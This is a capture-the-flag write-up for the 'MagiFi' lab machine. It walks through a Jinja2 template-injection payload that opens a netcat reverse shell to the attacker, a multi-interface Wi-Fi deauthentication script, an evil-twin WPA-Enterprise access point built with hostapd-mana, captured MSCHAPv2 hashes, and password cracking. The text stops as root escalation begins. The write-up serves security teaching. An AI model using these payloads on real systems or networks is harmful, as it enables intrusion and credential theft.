# Magifi

## Description

MagiFi is a machine designed to test a variety of offensive security skills, including web, network, wifi and privilege escalation techniques, requiring knowledge of network analysis and authentication mechanisms offering a realistic and immersive experience within a controlled environment. Creators @x4v1l0k and @M4rdc0re.

## Recon

::: details nmap_scan.log
```log
Open 10.0.2.62:80
Open 10.0.2.62:22
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.62

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0c:c6:d6:24:1e:5b:9e:66:25:0a:ba:0a:08:0b:18:40 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCihzhvruzjUnXRfyh685PiUN5ItFZ/V0IHymFDih4nSIcKYrhMIw06oKdfeT3zo4tP14xB3ZrjnI3sEFh9R8LV34dTNhH4cNUtbS/f0h2inMM35dJc533bNxJtT/znohcEjYgUP3PSCK3dOuP+CcMrW8z+0QJJE9gbw9DqC5hlCzZwBHJgMvNhP74hBD/JayHiS8G+K2G4owfXRHBs3LhEXYpHEibAHS/E1G1j9R2wzTLKoN5Y0JKQ+bLxGbJekcnSl2o6hlAarOQnX1I3G+EFgWexJn/xABxqEWk9B6NLhhPozoTyi43Xc/omUF6Cw9jFl2v4z7bABMVVPjlXH748C6tFeRzx6/mqAv2Ok2+Hzf1iessMzvYs1hnZBqL51gwcmBmMoSovm68d2jEKUwVQxEIsFH5lFGQciyM0rfn6EcA0up6iomAhs2fTA8MsOG6WJWd1Sw2nCTNygrmQ8tZfVGYz8rVaH8MkUENct8IxGN1iqel+9Cmdka9DDb+BMVM=
|   256 9c:c3:1d:ea:22:04:93:b7:81:dd:f2:96:5d:f0:1f:9b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBFAZBwooUDLqSK+kKOx+YVnScFejnY3t0q+D4qt3jCOsjP4dJ8Wf9ORNUbHa7CtlrK3WlqluzuRQsXJ10tvyTw8=
|   256 55:41:15:90:ff:1d:53:88:e7:65:91:4f:fd:cf:49:85 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGM6WqG9CguoVafo9uhRSPqtZG9yR57PD70/FKDqba9e
80/tcp open  http    syn-ack Werkzeug httpd 3.0.4 (Python 3.8.10)
|_http-title: Did not follow redirect to http://hogwarts.htb
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Werkzeug/3.0.4 Python/3.8.10
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

When you visit the IP you get redirected to `http://hogwarts.htb`, for a second I though I had conflict within my `dnsmasq` config but the box is truly using `htb` as TLD.

![writeup.png](/assets/pentest/hackmyvm/magifi/writeup.png)

### SSTI

When I saw the placeholders the first thing that came to my mind was SSTI so I tried common templates and also included HTML.

![writeup-1.png](/assets/pentest/hackmyvm/magifi/writeup-1.png)

SSTI is successful so I don't think there will be need for XSS/CSRF.

[https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#jinja2-python](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#jinja2-python)

### Reverse Shell

![writeup-2.png](/assets/pentest/hackmyvm/magifi/writeup-2.png)

```bash
Name: {{ cycler.__init__.__globals__.os.popen('busybox nc 10.0.2.15 4444 -e /bin/bash').read() }}
```

I wasn't able to get TTY 
```bash
â””â”€$ listen
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.0.2.62:56940.
id
uid=1006(harry_potter) gid=1006(harry_potter) groups=1006(harry_potter)
```

## SSH

Just upgrade  to SSH
```bash
â””â”€$ ssh-keygen -f id_rsa -q -P x && cat id_rsa.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINaR9Rdo3JzmFg6p5/vM5/zt8JD/xGO0QM6HQkgd36l2 woyag@kraken
---
mkdir ~/.ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINaR9Rdo3JzmFg6p5/vM5/zt8JD/xGO0QM6HQkgd36l2 woyag@kraken' > ~/.ssh/authorized_keys
---
â””â”€$ ssh -i id_rsa harry_potter@hogwarts.htb -t bash
harry_potter@MagiFi:~$ id
uid=1006(harry_potter) gid=1006(harry_potter) groups=1006(harry_potter)
```

### User.txt

```
harry_potter@MagiFi:~$ cat user.txt
hogwarts{ea4bc74f09fb69771165e57b1b215de9}
```

## Privilege Escalation (tom.riddle)

```bash
harry_potter@MagiFi:~$ sudo -l
Matching Defaults entries for harry_potter on MagiFi:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User harry_potter may run the following commands on MagiFi:
    (root) NOPASSWD: /usr/sbin/aireplay-ng, /usr/sbin/airmon-ng, /usr/sbin/airodump-ng, /usr/bin/airdecap-ng, /usr/bin/hostapd-mana
```

![](https://media1.tenor.com/m/4YXqmZgqmnAAAAAC/breaking-bad.gif)

As the description mentioned looks like we will have to play around with WiFi

### WiFi

~[Wi-Fi Penetration Testing: WPA2/3 Attack Methodology](https://thr0cut.github.io/research/wifi-penetration-testing)

*   **`aireplay-ng`** - A packet injection and traffic generation tool.
    *   **Example:** `aireplay-ng --deauth 10 -a 00:11:22:33:44:55 wlan0mon`
    *   **What it does:** This command sends 10 deauthentication packets, disconnecting all clients from the access point with the MAC address `00:11:22:33:44:55`. This is often done to force a client to reconnect, allowing another tool to capture the cryptographic handshake needed to crack the Wi-Fi password.

*   **`airmon-ng`** - A script to manage wireless network interfaces.
    *   **Example:** `airmon-ng start wlan0`
    *   **What it does:** This command puts your wireless interface (`wlan0`) into monitor mode. The tool typically creates a new interface named like `wlan0mon`. This new interface can now listen to all wireless traffic in the area, a prerequisite for the other tools in this suite.

*   **`airodump-ng`** - A network discovery and packet capture tool.
    *   **Example:** `airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon`
    *   **What it does:** This command tells the tool to focus on channel 6 (`-c 6`), specifically on the access point with the MAC `00:11:22:33:44:55` (`--bssid`), and to save all captured data to files starting with the name "capture" (`-w capture`). It will display a live list of all connected clients and, importantly, capture the WPA handshake when a client connects.

*   **`airdecap-ng`** - A tool for decrypting wireless capture files.
    *   **Example:** `airdecap-ng -p MyPassword123 -e MyHomeNetwork capture-01.cap`
    *   **What it does:** If you know the Wi-Fi password (`MyPassword123`) and the network name (`MyHomeNetwork`), this command will decrypt the traffic inside the capture file `capture-01.cap` and create a new, decrypted file. This allows you to analyze the previously encrypted network traffic, such as viewing websites visited.

*   **`hostapd-mana`** - An enhanced tool to create a software-based access point for security testing.
    *   **Example:** You create a configuration file (`mana.conf`) that sets your Wi-Fi card's interface, network name (SSID) to "Free_Public_WiFi", and the channel. You then run `hostapd-mana mana.conf`.
    *   **What it does:** Your computer now broadcasts a fake wireless network called "Free_Public_WiFi". When users connect to it, `hostapd-mana` can forward their connection to the real internet while simultaneously logging their activity or presenting a fake login portal to capture their credentials.

There a quite a lot of wireless interfaces
```bash
harry_potter@MagiFi:~$ ip -brief a s
lo               UNKNOWN        127.0.0.1/8 ::1/128
enp0s3           UP             10.0.2.62/24 fe80::a00:27ff:fece:c2d7/64
docker0          DOWN           172.17.0.1/16
wlan0            DOWN
wlan1            DOWN
wlan2            DOWN
wlan3            DOWN
wlan4            DOWN
wlan5            DOWN
wlan6            DOWN
wlan60           DOWN
hwsim0           DOWN
veth1@if77       UP             10.200.1.1/24 fe80::e80d:17ff:feff:3728/64
veth2@if79       UP             10.200.2.1/24 fe80::7038:28ff:feb6:4db6/64
harry_potter@MagiFi:~$ iwconfig
wlan5     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=0 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on

wlan1     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=0 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on

wlan4     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=0 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on

wlan0     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=0 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on

wlan3     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=0 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on

wlan6     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=0 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on

wlan60    IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=0 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on

wlan2     IEEE 802.11  ESSID:off/any
          Mode:Managed  Access Point: Not-Associated   Tx-Power=0 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
```

First let's get rid of processes that might interfere 
```bash
harry_potter@MagiFi:~$ sudo airmon-ng check

Found 1 processes that could cause trouble.
Kill them using 'airmon-ng check kill' before putting
the card in monitor mode, they will interfere by changing channels
and sometimes putting the interface back in managed mode

    PID Name
    632 dhclient

harry_potter@MagiFi:~$ sudo airmon-ng check kill

Killing these processes:

    PID Name
    632 dhclient
```

Put wireless card in monitor mode
```bash
harry_potter@MagiFi:~$ sudo /usr/sbin/airmon-ng start wlan0


PHY     Interface       Driver          Chipset

phy10   wlan0           mac80211_hwsim  Software simulator of 802.11 radio(s) for mac80211

                (mac80211 monitor mode vif enabled for [phy10]wlan0 on [phy10]wlan0mon)
                (mac80211 station mode vif disabled for [phy10]wlan0)
phy11   wlan1           mac80211_hwsim  Software simulator of 802.11 radio(s) for mac80211
phy12   wlan2           mac80211_hwsim  Software simulator of 802.11 radio(s) for mac80211
phy13   wlan3           mac80211_hwsim  Software simulator of 802.11 radio(s) for mac80211
phy14   wlan4           mac80211_hwsim  Software simulator of 802.11 radio(s) for mac80211
phy15   wlan5           mac80211_hwsim  Software simulator of 802.11 radio(s) for mac80211
phy16   wlan6           mac80211_hwsim  Software simulator of 802.11 radio(s) for mac80211
phy70   wlan60          mac80211_hwsim  Software simulator of 802.11 radio(s) for mac80211
```

Capture packets and display information about wireless network(s) on both 2.4GHz and 5GHz bands
```bash
harry_potter@MagiFi:~$ sudo airodump-ng wlan0mon --band abg
 CH 100 ][ Elapsed: 18 s ][ 2025-09-29 09:48

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 F0:9F:C2:71:22:15  -28        5        0    0  44   54e  WPA2 CCMP   MGT  wifi-college
 F0:9F:C2:71:22:17  -28        5        0    0  40   54e  WPA2 CCMP   MGT  wifi-college
 F0:9F:C2:71:22:16  -28        5        0    0  36   54e  WPA2 CCMP   MGT  wifi-college

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 (not associated)   64:32:A8:07:6C:41  -29    0 - 1      0        2         wifi-college
```

De-authenticate / wait for a client to connect to capture a handshake
```bash
harry_potter@MagiFi:~$ sudo aireplay-ng --deauth 10 -a F0:9F:C2:71:22:15 wlan0mon
09:59:03  Waiting for beacon frame (BSSID: F0:9F:C2:71:22:15) on channel 124
09:59:17  No such BSSID available.
harry_potter@MagiFi:~$ sudo aireplay-ng --deauth 10 -a F0:9F:C2:71:22:16 wlan0mon
09:59:03  Waiting for beacon frame (BSSID: F0:9F:C2:71:22:16) on channel 124
09:59:17  No such BSSID available.
harry_potter@MagiFi:~$ sudo aireplay-ng --deauth 10 -a F0:9F:C2:71:22:17 wlan0mon
09:59:03  Waiting for beacon frame (BSSID: F0:9F:C2:71:22:17) on channel 124
09:59:17  No such BSSID available.
```

Hmm... fake APs?

```bash
harry_potter@MagiFi:~$ cd `mktemp -d`
harry_potter@MagiFi:/tmp/tmp.tUm1L4OIHe$ sudo airodump-ng wlan0mon --band a -c 36,40,44 -w `pwd`/
```

Scanning followed by a deauth attack was required for the requests to succeed.

![writeup-3.png](/assets/pentest/hackmyvm/magifi/writeup-3.png)

::: info Note
Let it run for few minutes, also I had to switch to `...:16`, not sure if that makes difference.
:::

There's some data, but no password
```bash
â””â”€$ aircrack-ng -w $rockyou 01.cap
# No password cracked, only `...:17` had data
```

Hmmm
```bash
harry_potter@MagiFi:/tmp/tmp.tUm1L4OIHe$ strings ./* | grep hogwarts | sort | uniq -c | sort -nr
     12 ca@hogwarts.htb0
      4 server@hogwarts.htb0
harry_potter@MagiFi:/tmp/tmp.tUm1L4OIHe$ strings ./* | grep 'Hogwarts\\'
Hogwarts\rubeus.hagrid
Hogwarts\tom.riddle
Hogwarts\minerva.mcgonagall
Hogwarts\albus.dumbledore
```

The deauthentication attack and monitoring confirmed the successful capture of a complete WPA handshake. This captured data contains the full cryptographic authentication exchange between the client device and the access point.

![writeup-4.png](/assets/pentest/hackmyvm/magifi/writeup-4.png)

```
ssl.handshake.type == 11
```

### Evil Twin EAP-TLS

- [Evil Twin EAP-TLS](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/pentesting-wifi/evil-twin-eap-tls.html#evil-twin-eap-tls)
- [Attacking Weakly-Configured EAP-TLS Wireless Infrastructures](https://versprite.com/blog/eap-tls-wireless-infrastructure)
- [Attacking WPA Enterprise](https://shuciran.github.io/posts/Attacking-WPA-Enterprise)

Extract SSL information, after digging around `RelativeDistinguishedName` seemed to have all information.
```bash
â””â”€$ tshark -r scan-01.cap -Y "ssl.handshake.type == 11" -V | grep -oP 'RelativeDistinguishedName.*-at-(\K[^)]+)' | sort | uniq
commonName=Hogwarts Certificate Authority
countryName=ES
emailAddress=ca@hogwarts.htb
emailAddress=server@hogwarts.htb
localityName=Madrid
organizationalUnitName=Hogwarts College
organizationName=Hogwarts
stateOrProvinceName=Madrid
```

Later I found I could just read `DER`
```bash
harry_potter@MagiFi:/tmp/tmp.RFrjgfbo9f$ tshark -r ./-01.cap -Y "ssl.handshake.type == 11" -T fields -e tls.handshake.certificate | sort | uniq | xxd -r -p > cert.der
harry_potter@MagiFi:/tmp/tmp.RFrjgfbo9f$ openssl x509 -inform der -in cert.der -text | grep -v '..:..:'
Certificate:
    Data:
        Version: 1 (0x0)
        Serial Number:
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: C = ES, ST = Madrid, L = Madrid, O = Hogwarts, OU = Hogwarts College, CN = Hogwarts Certificate Authority, emailAddress = ca@hogwarts.htb
        Validity
        Subject: C = ES, ST = Madrid, L = Madrid, O = Hogwarts, OU = Hogwarts College, CN = Hogwarts Certificate Authority, emailAddress = server@hogwarts.htb
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                RSA Public-Key: (2048 bit)
                Modulus:
                    f0:ad
                Exponent: 65537 (0x10001)
    Signature Algorithm: sha256WithRSAEncryption
-----BEGIN CERTIFICATE-----
MIID2TCCAsECFHmMOKyTNfgI1cshrQJUjIgnGGkAMA0GCSqGSIb3DQEBCwUAMIGm
MQswCQYDVQQGEwJFUzEPMA0GA1UECAwGTWFkcmlkMQ8wDQYDVQQHDAZNYWRyaWQx
ETAPBgNVBAoMCEhvZ3dhcnRzMRkwFwYDVQQLDBBIb2d3YXJ0cyBDb2xsZWdlMScw
JQYDVQQDDB5Ib2d3YXJ0cyBDZXJ0aWZpY2F0ZSBBdXRob3JpdHkxHjAcBgkqhkiG
9w0BCQEWD2NhQGhvZ3dhcnRzLmh0YjAeFw0yNDA5MjcwOTQyMDRaFw0zNDA5MjUw
OTQyMDRaMIGqMQswCQYDVQQGEwJFUzEPMA0GA1UECAwGTWFkcmlkMQ8wDQYDVQQH
DAZNYWRyaWQxETAPBgNVBAoMCEhvZ3dhcnRzMRkwFwYDVQQLDBBIb2d3YXJ0cyBD
b2xsZWdlMScwJQYDVQQDDB5Ib2d3YXJ0cyBDZXJ0aWZpY2F0ZSBBdXRob3JpdHkx
IjAgBgkqhkiG9w0BCQEWE3NlcnZlckBob2d3YXJ0cy5odGIwggEiMA0GCSqGSIb3
DQEBAQUAA4IBDwAwggEKAoIBAQCjzZjqgR5NTTYMv6N40pjoy+NCUWvow6q9yCs8
ypr94VZOHzlixsAOOG8us7xeZk2V9uDnJR/cZ5+k1KMFaoXAP3oY+2PdLelgfSXn
TyceVwPOM68+EUzBxm7uoOE5eUBrhJV5v+JyjcMnrcJzvyD1hMHbCAe4BVgqJhD1
nx+RD9DIJtg4BjFF5AdMrWQnr7IVOQlb/mNa6gDoIYQo1ol+eRUU1L5xKiw4Ga6E
E/9s3IFmfUq20sEhCnjUVLsywR7yJ9YKDNPi2AFtb5mPj2GTops+XvcAtQBbZN/p
fTR4Puabez2qUqyBjTzBrUDP2QeY/h044JzHRGjHwTqwcPCtAgMBAAEwDQYJKoZI
hvcNAQELBQADggEBACnH8Amz1C/TFVZQ/P1KCQyZeN8nUdUN/uNZYVrRiXHX+Mpj
gzOurxH22wEPfgFmEfyXGuqVjqDNfWiXbUmcwPaILBlgoqYduSXi5jzw9jVGBcDu
HV96aJuXoXI46J6tFCHxpoQxJYRfSgijBp6hE4PEmhzEe2HLCEcsDH2wdchzrpk+
i7HYs05v+O32E9r9AMurcc7iKdTt4hnE28KpvpC7462HP37d55DsPrxxlJeVYBVv
NM3PYpCZzKB3ORqi3aNVOYMObnHeacedBuyU9wrIC0QkwRRZHb65vNd0I9RhkSS9
fVuP6LnYk/io560K8men9y9x33UTLLHh9ZxVQK0=
-----END CERTIFICATE-----
```

**[FreeRadius](https://www.freeradius.org)** is installed so we could create a Fake AP and potentially make others connect to it (?).
```bash
harry_potter@MagiFi:/tmp/tmp.RFrjgfbo9f$ dpkg -l | grep -i radius
ii  freeradius                            3.0.20+dfsg-3ubuntu0.4            amd64        high-performance and highly configurable RADIUS server
ii  freeradius-common                     3.0.20+dfsg-3ubuntu0.4            all          FreeRADIUS common files
ii  freeradius-config                     3.0.20+dfsg-3ubuntu0.4            amd64        FreeRADIUS default config files
ii  freeradius-utils                      3.0.20+dfsg-3ubuntu0.4            amd64        FreeRADIUS client utilities
ii  libfreeradius3                        3.0.20+dfsg-3ubuntu0.4            amd64        FreeRADIUS shared library
```

```bash
harry_potter@MagiFi:/tmp/fakeap$ cp /etc/freeradius/3.0/certs . -r
harry_potter@MagiFi:/tmp/fakeap$ chmod 777 ./certs/
harry_potter@MagiFi:/tmp/fakeap$ cd certs/

harry_potter@MagiFi:/tmp/fakeap/certs$ nano ca.cnf
...
[certificate_authority]
countryName             = ES
stateOrProvinceName     = Madrid
localityName            = Madrid
organizationName        = Hogwarts
emailAddress            = ca@hogwarts.htb
commonName              = "Hogwarts Certificate Authority"
...

harry_potter@MagiFi:/tmp/fakeap/certs$ nano server.cnf
...
[server]
countryName             = ES
stateOrProvinceName     = Madrid
localityName            = Madrid
organizationName        = Hogwarts
emailAddress            = server@hogwarts.htb
commonName              = "Hogwarts Server Authority"
...

harry_potter@MagiFi:/tmp/fakeap/certs$ make
harry_potter@MagiFi:/tmp/fakeap/certs$ make
openssl dhparam -out dh -2 2048
Generating DH parameters, 2048 bit long safe prime, generator 2
This is going to take a long time
...
Signature ok
The countryName field is different between
CA certificate (ES) and the request (FR)
make: *** [Makefile:120: client.crt] Error 1
```

::: info Note
Got an error, but it's ok
:::

Configure `hostapd-mana`
```bash
harry_potter@MagiFi:/tmp/fakeap/certs$ nano /tmp/hostapd-mana/mana.conf
# SSID of the AP
ssid=wifi-college

# Network interface to use and driver type
# We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'
interface=wlan1
driver=nl80211

# Channel and mode
# Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)
channel=1
# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
hw_mode=g

# Setting up hostapd as an EAP server
ieee8021x=1
eap_server=1

# Key workaround for Win XP
eapol_key_index_workaround=0

# EAP user file we'll create after this step
eap_user_file=/tmp/hostapd-mana/mana.eap_user

# Certificate paths created earlier
ca_cert=/tmp/fakeap/certs/ca.pem
server_cert=/tmp/fakeap/certs/server.pem
private_key=/tmp/fakeap/certs/server.key
private_key_passwd=whatever
dh_file=/tmp/fakeap/certs/dh

# Open authentication
auth_algs=1
# WPA/WPA2
wpa=2
# WPA Enterprise
wpa_key_mgmt=WPA-EAP
# Allow CCMP and TKIP
# Note: iOS warns when network has TKIP (or WEP)
wpa_pairwise=CCMP TKIP

# Enable Mana WPE
mana_wpe=1

# Store credentials in that file
mana_credout=/tmp/hostapd-mana/hostapd.credout

# Send EAP success, so the client thinks it's connected
mana_eapsuccess=1

# EAP TLS MitM
mana_eaptls=1
```

Create the EAP user file referenced in the configuration file
```bash
harry_potter@MagiFi:/tmp/fakeap/certs$ cat /tmp/hostapd-mana/mana.eap_user
*     PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
```

TheÂ `mana.eap_user`Â file defines howÂ `hostapd-mana`Â handles EAP authentication attempts. This configuration accepts multiple EAP methods and captures credentials from connecting clients.

- **`*`**Â - MatchesÂ **ANY username**
- **`PEAP,TTLS,TLS,FAST`**Â - Accepts these EAP methods
- **Purpose**: Acts as a catch-all to accept any client connection attempt using common enterprise authentication methods

- **`"t"`**Â - Specific username for testing
- **Authentication Methods**: Supports various inner authentication protocols:
    - `TTLS-PAP`,Â `TTLS-CHAP`,Â `TTLS-MSCHAP`Â - Tunneled authentication methods
    - `MSCHAPV2`,Â `MD5`Â - Common challenge-response protocols
    - `GTC`Â - Generic Token Card (often used with OTP)
- **`"pass"`**Â - The password that will be accepted for user "t"
- **`[2]`**Â - TTLS tunnel preference indicator

Deauth all networks so others try connecting to you
```bash
#!/bin/bash

INTERFACES=("wlan2" "wlan3" "wlan4")
CHANNELS=("44" "36" "40")
BSSIDS=("F0:9F:C2:71:22:15" "F0:9F:C2:71:22:16" "F0:9F:C2:71:22:17")
DEAUTH_COUNT=30

log() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1";  }

cleanup_interfaces() {
    log "Cleaning up monitor interfaces...";
    for interface in "${INTERFACES[@]}"; do
        sudo airmon-ng stop "${interface}mon" >/dev/null 2>&1 && log "Stopped ${interface}mon";
    done
}

enable_interfaces() {
    for i in "${!INTERFACES[@]}"; do
        interface="${INTERFACES[$i]}";
        channel="${CHANNELS[$i]}";
        sudo airmon-ng start "$interface" "$channel" >/dev/null 2>&1 && log "Stopped ${interface}mon";
    done
}

run_aireplay() {
    for i in "${!INTERFACES[@]}"; do
        interface="${INTERFACES[$i]}"
        bssid="${BSSIDS[$i]}"
        channel="${CHANNELS[$i]}"
        log "Attacking $bssid via ${interface}mon (channel $channel)"
        sudo aireplay-ng -0 "$DEAUTH_COUNT" -a "$bssid" "${interface}mon" &
    done
}

echo "Running deauthentication attack..."
trap cleanup_interfaces EXIT INT TERM
enable_interfaces
run_aireplay
wait
```

```bash
harry_potter@MagiFi:/tmp/fakeap/certs$ sudo hostapd-mana /tmp/hostapd-mana/mana.conf
Configuration file: /tmp/hostapd-mana/mana.conf
MANA: Captured credentials will be written to file '/tmp/hostapd-mana/hostapd.credout'.
Using interface wlan1 with hwaddr 42:00:00:00:01:00 and ssid "wifi-college"
wlan1: interface state UNINITIALIZED->ENABLED
wlan1: AP-ENABLED
wlan1: STA 64:32:a8:07:6c:42 IEEE 802.11: authenticated
wlan1: STA 64:32:a8:07:6c:42 IEEE 802.11: associated (aid 1)
wlan1: CTRL-EVENT-EAP-STARTED 64:32:a8:07:6c:42
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
wlan1: STA 64:32:a8:07:6c:41 IEEE 802.11: authenticated
MANA EAP Identity Phase 0: Hogwarts\minerva.mcgonagall
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
wlan1: STA 64:32:a8:07:6c:43 IEEE 802.11: authenticated
wlan1: STA 64:32:a8:07:6c:41 IEEE 802.11: associated (aid 2)
wlan1: CTRL-EVENT-EAP-STARTED 64:32:a8:07:6c:41
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
MANA EAP Identity Phase 0: Hogwarts\albus.dumbledore
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
wlan1: STA 64:32:a8:07:6c:43 IEEE 802.11: associated (aid 3)
wlan1: CTRL-EVENT-EAP-STARTED 64:32:a8:07:6c:43
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
MANA EAP Identity Phase 0: Hogwarts\tom.riddle
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
MANA EAP Identity Phase 1: Hogwarts\albus.dumbledore
MANA EAP EAP-MSCHAPV2 ASLEAP user=albus.dumbledore | asleap -C 8c:3c:41:f3:de:b6:59:f9 -R ac:1f:31:48:52:43:9c:3c:4f:13:2b:90:b1:f9:78:3b:59:c6:0c:23:9e:65:8b:f7
MANA EAP EAP-MSCHAPV2 JTR | albus.dumbledore:$NETNTLM$8c3c41f3deb659f9$ac1f314852439c3c4f132b90b1f9783b59c60c239e658bf7:::::::
MANA EAP EAP-MSCHAPV2 HASHCAT | albus.dumbledore::::ac1f314852439c3c4f132b90b1f9783b59c60c239e658bf7:8c3c41f3deb659f9
EAP-MSCHAPV2: Derived Master Key - hexdump(len=16): 23 a7 9a 23 c1 50 72 39 c7 b6 74 17 3c 11 c7 eb
MANA EAP Identity Phase 1: Hogwarts\tom.riddle
MANA EAP Identity Phase 1: Hogwarts\minerva.mcgonagall
MANA EAP EAP-MSCHAPV2 ASLEAP user=tom.riddle | asleap -C e4:f4:4c:28:72:c4:30:0a -R 2d:9f:74:99:5a:fc:8a:50:14:c5:f3:68:ab:a5:d2:c5:67:c6:2c:f7:83:88:e5:4e
MANA EAP EAP-MSCHAPV2 JTR | tom.riddle:$NETNTLM$e4f44c2872c4300a$2d9f74995afc8a5014c5f368aba5d2c567c62cf78388e54e:::::::
MANA EAP EAP-MSCHAPV2 HASHCAT | tom.riddle::::2d9f74995afc8a5014c5f368aba5d2c567c62cf78388e54e:e4f44c2872c4300a
EAP-MSCHAPV2: Derived Master Key - hexdump(len=16): a5 0f 27 60 69 ed 55 49 fc 06 91 24 cc ee 5c 95
MANA EAP EAP-MSCHAPV2 ASLEAP user=minerva.mcgonagall | asleap -C 92:b2:15:35:62:95:0f:2a -R 10:c9:d7:43:be:0f:81:b5:75:3e:7b:3c:6c:ba:39:0a:d8:af:f4:e9:fd:27:d1:19
MANA EAP EAP-MSCHAPV2 JTR | minerva.mcgonagall:$NETNTLM$92b2153562950f2a$10c9d743be0f81b5753e7b3c6cba390ad8aff4e9fd27d119:::::::
MANA EAP EAP-MSCHAPV2 HASHCAT | minerva.mcgonagall::::10c9d743be0f81b5753e7b3c6cba390ad8aff4e9fd27d119:92b2153562950f2a
EAP-MSCHAPV2: Derived Master Key - hexdump(len=16): 08 98 b3 5a 1f ec c2 40 a7 d2 df 4c b0 7b fc f1
wlan1: STA 64:32:a8:07:6c:40 IEEE 802.11: authenticated
wlan1: STA 64:32:a8:07:6c:40 IEEE 802.11: associated (aid 1)
wlan1: CTRL-EVENT-EAP-STARTED 64:32:a8:07:6c:40
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
MANA EAP Identity Phase 0: Hogwarts\rubeus.hagrid
wlan1: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
MANA EAP Identity Phase 1: Hogwarts\rubeus.hagrid
MANA EAP EAP-MSCHAPV2 ASLEAP user=rubeus.hagrid | asleap -C ab:7a:ad:41:42:79:11:36 -R cb:5b:01:e9:60:1a:fa:6e:ab:3f:70:a1:a1:c8:45:18:8d:9c:c7:c2:30:3b:1c:de
MANA EAP EAP-MSCHAPV2 JTR | rubeus.hagrid:$NETNTLM$ab7aad4142791136$cb5b01e9601afa6eab3f70a1a1c845188d9cc7c2303b1cde:::::::
MANA EAP EAP-MSCHAPV2 HASHCAT | rubeus.hagrid::::cb5b01e9601afa6eab3f70a1a1c845188d9cc7c2303b1cde:ab7aad4142791136
EAP-MSCHAPV2: Derived Master Key - hexdump(len=16): 5c 0f ca 5a 3e f7 e6 55 04 76 72 79 80 6e 1c 91
```

```bash
albus.dumbledore::::ac1f314852439c3c4f132b90b1f9783b59c60c239e658bf7:8c3c41f3deb659f9
tom.riddle::::2d9f74995afc8a5014c5f368aba5d2c567c62cf78388e54e:e4f44c2872c4300a
minerva.mcgonagall::::10c9d743be0f81b5753e7b3c6cba390ad8aff4e9fd27d119:92b2153562950f2a
rubeus.hagrid::::cb5b01e9601afa6eab3f70a1a1c845188d9cc7c2303b1cde:ab7aad4142791136
```

```powershell
âžœ john.exe \Users\Public\hashes.txt --wordlist=\Users\Public\rockyou.txt
blackhogwarts    (tom.riddle)
1g 0:00:00:02 DONE (2025-09-29 22:37) 0.4545g/s 6519Kp/s 23921Kc/s 23921KC/s !!ashlea!!..â™¦*â™¥7Â¡Vamos!â™¥
```

## Privilege Escalation (root)

```bash
â””â”€$ sshpass -p 'blackhogwarts' ssh tom.riddle@hogwarts.htb -t bash
